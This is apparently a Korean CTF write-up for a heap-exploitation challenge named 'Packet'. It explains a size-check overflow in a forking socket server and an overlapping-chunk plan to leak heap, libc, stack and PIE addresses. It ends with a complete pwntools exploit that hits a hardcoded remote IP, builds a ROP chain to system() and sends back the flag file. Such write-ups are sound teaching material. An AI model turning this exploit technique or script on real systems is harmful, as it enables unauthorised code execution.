
# Packet

### 보호 기법

```bash
[*] '/mnt/d/final/packet/prob'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

다 걸려있다.

### 분석

```C
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  uint16_t v3; // ax
  int v4; // eax
  int optval; // [rsp+1Ch] [rbp-44h] BYREF
  socklen_t addr_len; // [rsp+20h] [rbp-40h] BYREF
  int fd; // [rsp+24h] [rbp-3Ch]
  int v8; // [rsp+28h] [rbp-38h]
  __pid_t v9; // [rsp+2Ch] [rbp-34h]
  sockaddr addr; // [rsp+30h] [rbp-30h] BYREF
  struct sockaddr v11; // [rsp+40h] [rbp-20h] BYREF
  unsigned __int64 v12; // [rsp+58h] [rbp-8h]

  v12 = __readfsqword(0x28u);
  optval = 1;
  addr_len = 16;
  setvbuf(_bss_start, 0LL, 2, 0LL);
  if ( argc != 2 )
  {
    printf("Usage : %s PORT\n", *argv);
    exit(0);
  }
  signal(17, (__sighandler_t)sigchld_handler);
  fd = socket(2, 1, 0);
  setsockopt(fd, 1, 2, &optval, 4u);
  addr.sa_family = 2;
  v3 = atoi(argv[1]);
  *(_WORD *)addr.sa_data = htons(v3);
  *(_DWORD *)&addr.sa_data[2] = 0;
  bind(fd, &addr, 0x10u);
  listen(fd, 5);
  v4 = atoi(argv[1]);
  printf("Server listening on port %d...\n", v4);
  while ( 1 )
  {
    while ( 1 )
    {
      v8 = accept(fd, &v11, &addr_len);
      if ( v8 >= 0 )
        break;
      printf("accept");
    }
    v9 = fork();
    if ( !v9 )
      break;
    if ( v9 <= 0 )
    {
      printf("fork error");
      exit(-1);
    }
    close(v8);
  }
  close(fd);
  puts("Client connected.");
  handle_packet(v8);
}
```

`while` 안에서 `fork`를 수행 중이므로 원하는 만큼 자식 프로세스를 연결할 수 있다. `fork`는 부모 프로세스의 메모리를 그대로 복사하므로 익스에 활용할 부분이 많다. 하지만 뒤에서 설명하겠듯이 힙 레이아웃이 더럽기 때문에 힙 외의 부분을 고려하고 싶지 않아 풀이에 사용하지는 않았다. 자식 프로세스가 연결되면 `handle_packet`으로 넘어간다.

```C
void __fastcall __noreturn handle_packet(int a1)
{
  unsigned __int16 v1; // [rsp+10h] [rbp-20h]
  _BYTE v2[21]; // [rsp+1Bh] [rbp-15h] BYREF

  *(_QWORD *)&v2[13] = __readfsqword(0x28u);
  prctl(1, 9LL);
  strcpy(v2, "Enter data: ");
  while ( 1 )
  {
    while ( 1 )
    {
      send_raw(a1, v2, 0xCu);
      flush(a1);
      memset(&packet, 0, 0x18uLL);
      if ( !(unsigned int)recv_raw(a1, &packet, 4u) )
        break;
      printf("Recv error");
      flush(a1);
    }
    v1 = word_4062;
    if ( (unsigned __int16)word_4062 > 2u )
      break;
    if ( packet == 4096 )
    {
      if ( (unsigned int)get_info(a1, (__int64)&packet) )
        puts("get error");
    }
    else if ( (unsigned __int16)packet <= 0x1000u )
    {
      if ( packet == 256 )
      {
        if ( (unsigned int)set_info(a1, (__int64)&packet) )
          puts("set error");
        else
          *(_BYTE *)(**(_QWORD **)&info[8 * v1] + *(unsigned int *)(*(_QWORD *)&info[8 * v1] + 8LL)) = 0;
      }
      else if ( (unsigned __int16)packet <= 0x100u )
      {
        if ( packet == 1 )
        {
          if ( (unsigned int)recv_data(a1, (__int64)&packet) )
          {
            puts("write error");
          }
          else
          {
            *(_BYTE *)((unsigned int)(dword_4064 + dword_4068) + qword_4070) = 0;
            *(_DWORD *)(recvbuf[v1] + 0x10000LL) = dword_4064;
            *(_DWORD *)(recvbuf[v1] + 0x10004LL) = dword_4068;
          }
        }
        else if ( packet == 16 )
        {
          if ( (unsigned int)clear_data(a1, (__int64)&packet) )
            puts("clear error");
        }
      }
    }
  }
  printf("Index error");
  exit(-1);
}
```

```C
struct input{
  uint16_t cmd;
  uint16_t index;
  uint32_t startpoint;
  uint32_t size;
};
```

입력은 함수 내부까지 포함하여 12바이트로 구성된다. 아래의 구조체로 정리할 수 있다. `send_raw`와 `recv_raw`는 부모와 자식 간의 통신을 구현한 함수이다. ida에 정리해놓진 않았는데 `&word_4062`이 `&packet + 2`라서 인덱스가 `0, 1, 2`로 총 3개만 허용됨을 알 수 있다.

```c
__int64 __fastcall recv_data(int a1, __int64 a2)
{
  _BYTE v3[6]; // [rsp+1Ah] [rbp-16h]
  unsigned int v4; // [rsp+1Ch] [rbp-14h]

  *(_DWORD *)&v3[2] = recv_raw(a1, (void *)(a2 + 4), 8u);
  if ( *(_DWORD *)&v3[2] )
    return *(unsigned int *)&v3[2];
  *(_DWORD *)v3 = *(unsigned __int16 *)(a2 + 2);
  if ( !recvbuf[*(unsigned __int16 *)v3] )
    recvbuf[*(unsigned __int16 *)v3] = malloc(0x10008uLL);
  *(_QWORD *)(a2 + 16) = recvbuf[*(unsigned __int16 *)v3];
  if ( (unsigned int)(*(_DWORD *)(a2 + 4) + *(_DWORD *)(a2 + 8)) > 0xFFFF )
    return *(unsigned int *)&v3[2];
  v4 = recv_raw(a1, (void *)(*(unsigned int *)(a2 + 4) + *(_QWORD *)(a2 + 16)), *(_DWORD *)(a2 + 8));
  if ( v4 )
    return v4;
  else
    return 0LL;
}
```

`recv_data`에서는 `0x10008` 크기를 가진(실제로는 `0x10010`) 청크(`data_chunk`라고 부르겠다.)에 데이터를 입력받아 저장한다.
`if ( (unsigned int)(*(_DWORD *)(a2 + 4) + *(_DWORD *)(a2 + 8)) > 0xFFFF )` 여기서 `oob`가 발생한다. `*(_DWORD *)(a2 + 4) + *(_DWORD *)(a2 + 8)` 계산 후 `(unsigned int)`를 씌우므로, `0xFFFF`를 넘는 양수와 음수를 더하면 조건문을 통과할 수 있다. `recv_raw`는 `recv`로 구성되어 있으며 `recv`의 세 번째 인자는 `size_t` 형이므로 `int`에서는 음수여도 `recv`에서는 양수로 취급된다. 따라서 `startpoint`를 크게 하고 `size`를 음수로 보내면 할당된 청크 이후로의 힙을 원하는 값으로 쓸 수 있다. `recv`는 쓰기 불가능한 영역을 만나면 `panic`을 일으키지 않고 그냥 함수가 종료되므로 힙 청크 끝까지 쓸만큼을 계산해서 그 길이만큼 데이터를 보내면 된다.

```C
__int64 __fastcall set_info(int a1, __int64 a2)
{
  void **v3; // rbx
  unsigned __int16 v4; // [rsp+1Ah] [rbp-16h]
  unsigned int v5; // [rsp+1Ch] [rbp-14h]
  unsigned int v6; // [rsp+1Ch] [rbp-14h]

  v5 = recv_raw(a1, (void *)(a2 + 4), 8u);
  if ( v5 )
    return v5;
  if ( *(_DWORD *)(a2 + 8) > 0x2Fu )
    return 0LL;
  v4 = *(_WORD *)(a2 + 2);
  if ( !recvbuf[v4] )
    return 1LL;
  if ( !*(_QWORD *)&info[8 * v4] )
    *(_QWORD *)&info[8 * v4] = malloc(0x10uLL);
  if ( !**(_QWORD **)&info[8 * v4] )
  {
    v3 = *(void ***)&info[8 * v4];
    *v3 = malloc(0x30uLL);
  }
  v6 = recv_raw(a1, **(void ***)&info[8 * v4], *(_DWORD *)(a2 + 8));
  if ( v6 )
    return v6;
  *(_DWORD *)(*(_QWORD *)&info[8 * v4] + 8LL) = *(_DWORD *)(a2 + 8);
  return 0LL;
}

__int64 __fastcall get_info(int a1, __int64 a2)
{
  __int64 result; // rax
  unsigned __int16 v3; // [rsp+1Ah] [rbp-6h]
  unsigned int v4; // [rsp+1Ch] [rbp-4h]

  v4 = recv_raw(a1, (void *)(a2 + 4), 8u);
  if ( v4 )
    return v4;
  v3 = *(_WORD *)(a2 + 2);
  if ( !recvbuf[v3] )
    return 1LL;
  LODWORD(result) = !*((_QWORD *)&info + v3) || !**((_QWORD **)&info + v3);
  if ( (_DWORD)result )
    return (unsigned int)result;
  send_raw(a1, **((const void ***)&info + v3), 0x30u);
  return 0LL;
}
```

`set_info`에서는 첫 번째 청크(`info1`으로 칭하겠다.) 안에 두 번째 청크(`info2`으로 칭하겠다.). 주소를 넣는 방식으로 저장을 한다. `recv_data`를 거친 인덱스여야 하고, `info1`이 이미 있다면 `info2`만 새로 할당한다. `get_info`에서는 `info1`에 적혀있는 `info2`의 주소를 참조하여 데이터를 읽고 보낸다.

```C
__int64 __fastcall clear_data(int a1, __int64 a2)
{
  _BYTE v3[6]; // [rsp+1Ah] [rbp-6h]

  *(_DWORD *)&v3[2] = recv_raw(a1, (void *)(a2 + 4), 8u);
  if ( *(_DWORD *)&v3[2] )
    return *(unsigned int *)&v3[2];
  *(_DWORD *)v3 = *(unsigned __int16 *)(a2 + 2);
  if ( !recvbuf[*(unsigned __int16 *)v3] )
    return *(unsigned int *)&v3[2];
  memset((void *)recvbuf[*(unsigned __int16 *)v3], 0, 0x10008uLL);
  if ( *(_QWORD *)&info[8 * *(unsigned __int16 *)v3] )
  {
    free(**(void ***)&info[8 * *(unsigned __int16 *)v3]);
    memset(*(void **)&info[8 * *(unsigned __int16 *)v3], 0, 0x10uLL);
  }
  return 0LL;
}
```

`clear_data`에서는 `info2`는 해제하고, `info1`과 `data_chunk`는 초기화한다.

### 익스 계획

청크를 아래 순서로 할당한다. (`[i]`는 `i`번째 인덱스에 할당하는 것이다.)

```
[0] data_chunk(size : 0x10010)
[0] info1(size : 0x20)
[0] info2(size : 0x40)
[1] data_chunk(size : 0x10010)
[1] info1(size : 0x20)
[1] info2(size : 0x40)
top_chunk
```

`heap overflow` 취약점을 이용해 `size`를 아래와 같이 바꿔준다. `top_chunk`의 `size`도 항상 생각해서 넣어준다.

```
[0] data_chunk(size : 0x10010)
[0] info1(size : 0x20)
[0] info2(size : 0x40 + 0x10010 + 0x20 + 0x40)
([1] data_chunk(size : 0x10010))
top_chunk
```

새로운 청크를 아래와 같이 할당한다.

```
[0] data_chunk(size : 0x10010)
[0] info1(size : 0x20)
[0] info2(size : 0x40 + 0x10010 + 0x20 + 0x40)
[1] data_chunk(size : 0x10010) <- invisible
[1] info1(size : 0x20) <- invisible
[1] info2(size : 0x40) <- invisible
top_chunk
```

0번 인덱스에 `clear_data` 처리하고, 1번 인덱스에 `clear_data` 처리한다.

```
[0] data_chunk(size : 0x10010)
[0] info1(size : 0x20)
[0] info2(size : 0x40 + 0x10010 + 0x20 + 0x40) <- freed(unsorted bin)
[1] data_chunk(size : 0x10010) <- invisible
[1] info1(size : 0x20) <- invisible
[1] info2(size : 0x40) <- invisible & freed(tcache bin)
top_chunk
```

2번 인덱스에 `recv_data`로 `0x10010`짜리 청크를 할당한다.

```
[0] data_chunk(size : 0x10010)
[0] info1(size : 0x20)
[2] data_chunk(size : 0x10010)
[0] info2(size : 0x40 + 0x20 + 0x40) <- freed(unsorted bin)
[1] info1(size : 0x20) <- invisible
[1] info2(size : 0x40) <- invisible & freed(tcache bin)
top_chunk
```

2번 인덱스에 `set_info` 처리하여 `info2`를 새로 할당받는다. 이 때 1번 인덱스에 `clear_data` 처리했기 때문에 `[2] info2` 청크는 해당 주소가 `tcache bin`에 있어서 먼저 할당된다. 그 다음 1번 인덱스에 `set_info` 처리하는데, `[2] info1`과 `[1] info2` 청크는 `unsorted bin`의 제일 위에서 잘라서 준다. 여기서 힙이 겹치는데 정확한 주소가 궁금하다면 직접 디버깅하는 걸 추천한다. 0번 인덱스에 `set_info` 처리하면 최종 힙 레이아웃이 아래와 같다.

```
[0] data_chunk(size : 0x10010)
[0] info1(size : 0x20)
[2] data_chunk(size : 0x10010)
[2] info1(size : 0x20)
[1] info2(size : 0x40)
[1] info1(size : 0x20) <- invisible
[0, 2] info2(size : 0x40)
top_chunk
```

0번과 2번이 같은 힙을 가리키도록 만들었다. 0번의 `info2`를 해제하고 2번으로 읽으면 `heap_base`를 얻을 수 있다. `[0] data_chunk`가 모든 청크 중 최상위에 있고 `heap_base`를 구했으므로 모든 청크의 사이즈 조절도 가능하고, `heap_base`를 아는 상태이다. `recv_data`로 `[0] info1`, `[2] info1`에 적혀 있는 주소를 `[2] data_chunk`로 변조하고, 0번 인덱스에 `clear_data`를 취하면, 청크가 `unsorted bin`에 들어가기 때문에 2번 인덱스에서 `libc_base`를 딸 수 있다. 위의 두 예시처럼 자유자재로 `aar`, `aaw`이 가능하므로 `ROP`해준다.(여차하면 1번 인덱스를 사용해도 된다. 위 계획은 1번 인덱스도 사용 가능하다.) 우리에게 출력되게 하는 `fd`도 스택에 있으므로 읽어준 다음 리다이렉션으로 `flag`를 읽어준다.
대회 중에는 코드를 예쁘게 짜고 깊게 고민할 시간이 없어 중간에 불필요한 동작이 있을 수 있다. 양해 바란다.
### ex.py

```python
from pwn import *
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-r', '--remote', action='store_true', help='Connect to remote server')
parser.add_argument('-g', '--gdb', action='store_true', help='Attach GDB debugger')
args = parser.parse_args()

gdb_cmds = [
    'b *$rebase(0x00000000000171a)',
    'c'
]

binary = './prob'
 
context.binary = binary
context.arch = 'amd64'
# context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p2 = remote('16.184.29.60', 1337)
port = int(p2.recvline().split(b' ')[0])

if args.remote:
    p = remote("16.184.29.60", port)
else:
    p = process([binary, str(port)])
    if args.gdb:
        gdb.attach(p, '\n'.join(gdb_cmds))
l = ELF('./libc.so.6')

#p.interactive()

def recv_data(idx : int, startpoint : int, sz : int, dt : bytes):
    p.sendafter(b'data: ', p16(1) + p16(idx))
    p.send(p32(startpoint) + p32(sz))
    p.send(dt)

def set_info(idx : int, sz : int, dt : bytes):
    p.sendafter(b'data: ', p16(256) + p16(idx))
    p.send(p32(0) + p32(sz))    
    p.send(dt)

def clear_data(idx : int):
    p.sendafter(b'data: ', p16(16) + p16(idx))
    p.send(p32(0) + p32(0))

def get_info(idx : int):
    p.sendafter(b'data: ', p16(4096) + p16(idx))
    p.send(p32(0) + p32(0))
    return p.recvn(0x30)

recv_data(0, 0, 0, b'\x0a')
set_info(0, 0x20, b'\x00' * 0x20)
recv_data(1, 0, 0, b'\x00')
payload = p64(0x10010 + 0x40 + 0x20 + 0x40 + 1) + b'\x00' * 0x38
payload += p64(0x10011) + b'\x00' * 0x10008
payload += p64(0xcf1)
recv_data(0, 0x10028, -0x10028 & 0xffffffff, payload + b'\x00' * (0x10d38 - len(payload)))
sleep(1)
p.send(b'\x00')
set_info(1, 0x20, b'\x00' * 0x20)
clear_data(1)
clear_data(0)
recv_data(2, 0, 0, b'a')
set_info(0, 0, b'a')
set_info(2, 0, b'a')
set_info(1, 0, b'a')
clear_data(1)
recv_data(1, 0xffc8, 1, b'\x21')
recv_data(1, 0xffe8, 1, b'\x41')
heap_base = (u64(get_info(0)[:8]) << 12) - ((0x0000000556f29479 << 12) - 0x556f29459000)
print(hex(heap_base))
set_info(1, 0, b'a')
# payload = p64(0xa01) + b'\x00' * (0xa00 - 8) + p64(0xc91 + 0x40 - 0xa00) 
# recv_data(1, 0x10028, -0x10028 & 0xffffffff, payload + b'\x00' * (0xcc8 - len(payload)))
# sleep(1)
#p.send(b'\x00')
payload = p64(heap_base + 0x102c0 + 0x10) + b'\x00' * 16
payload += p64(0x10011) + b'\x00' * 0x10008
payload += p64(0x21) + p64(heap_base + 0x102c0 + 0x10) + b'\x00' * 16
payload += p64(0x21) + b'\x00' * 0x18
payload += p64(0x21) + p64(heap_base + 0x102c0 + 0x10) + b'\x00' * 16
payload += p64(0x41) + b'\x00' * 0x38
payload += p64(0xc91)
recv_data(0, 0x10010, -0x10010 & 0xffffffff, payload + b'\x00' * (0x10d50 - len(payload)))
sleep(1)
p.send(b'\x00')
clear_data(0)
l.address = u64(get_info(1)[:8]) - (0x7fd42b62cb20 - 0x7fd42b429000)
print(hex(l.address))
print(hex(l.sym['__environ']))

payload = p64(l.sym['__environ']) + b'\x00' * 16
payload += p64(0x10011) + b'\x00' * 0x10008
payload += p64(0x21) + p64(l.sym['__environ']) + b'\x00' * 16
payload += p64(0x21) + b'\x00' * 0x18
payload += p64(0x21) + p64(l.sym['__environ']) + b'\x00' * 16
payload += p64(0x41) + b'\x00' * 0x38
payload += p64(0xc91)
recv_data(0, 0x10010, -0x10010 & 0xffffffff, payload + b'\x00' * (0x10d50 - len(payload)))
sleep(1)
p.send(b'\x00')
stack = u64(get_info(0)[:8]) - (0x00007fff0be8f460 - 0x7fff0be8f278)
stack2 = u64(get_info(0)[:8]) - (0x00007ffdc2e8ab70 - 0x7ffdc2e8a9f4)
print(hex(stack))
print(hex(stack2))

payload = p64(stack2) + b'\x00' * 16
payload += p64(0x10011) + b'\x00' * 0x10008
payload += p64(0x21) + p64(stack2) + b'\x00' * 16
payload += p64(0x21) + b'\x00' * 0x18
payload += p64(0x21) + p64(stack2) + b'\x00' * 16
payload += p64(0x41) + b'\x00' * 0x38
payload += p64(0xc91)
recv_data(0, 0x10010, -0x10010 & 0xffffffff, payload + b'\x00' * (0x10d50 - len(payload)))
sleep(1)
p.send(b'\x00')
fd = u32(get_info(0)[4:8])
print(hex(fd))

payload = p64(stack2 - 0x34) + b'\x00' * 16
payload += p64(0x10011) + b'\x00' * 0x10008
payload += p64(0x21) + p64(stack2 - 0x34) + b'\x00' * 16
payload += p64(0x21) + b'\x00' * 0x18
payload += p64(0x21) + p64(stack2 - 0x34) + b'\x00' * 16
payload += p64(0x41) + b'\x00' * 0x38
payload += p64(0xc91)
recv_data(0, 0x10010, -0x10010 & 0xffffffff, payload + b'\x00' * (0x10d50 - len(payload)))
sleep(1)
p.send(b'\x00')
pie_base = u64(get_info(0)[8:0x10]) - 0x1e81
print(hex(pie_base))

payload = p64(pie_base + 0x4020) + b'\x00' * 16
payload += p64(0x10011) + b'\x00' * 0x10008
payload += p64(0x21) + p64(pie_base + 0x4020) + b'\x00' * 16
payload += p64(0x21) + b'\x00' * 0x18
payload += p64(0x21) + p64(pie_base + 0x4020) + b'\x00' * 16
payload += p64(0x41) + b'\x00' * 0x38
payload += p64(0xc91)
recv_data(0, 0x10010, -0x10010 & 0xffffffff, payload + b'\x00' * (0x10d50 - len(payload)))
sleep(1)
p.send(b'\x00')
set_info(0, 0x8, p64(stack))


dup2 = l.sym['dup2']
system = l.sym['system']
binsh = list(l.search(b'/bin/sh\x00'))[0]
pop_rdi = l.address + 0x000000000010f75b
pop_rsi = l.address + 0x0000000000110a4d
pop_rdx_rbx_r12_r13_rbp = l.address + 0x00000000000b503c
ret = l.address + 0x000000000002e81b
payload = p64(ret) + p64(pop_rdi) + p64(stack + 0x100) + p64(system)
payload = payload.ljust(0x100, b'\x00')
payload += f'cat /home/ctf/flag >& {fd}\x00'.encode()
#recv_data(0, 0, len(payload), payload)

p.sendafter(b'data: ', p16(1) + p16(0))
p.send(p32(0) + p32(len(payload)))
p.send(payload)
p.interactive()
#recv_data(2, (-0x40 - 0x20 - 0x40 - 0x8) & 0xffffffff, 0x40+0x20+0x40+0x8, payload)
#clear_data(0)
```
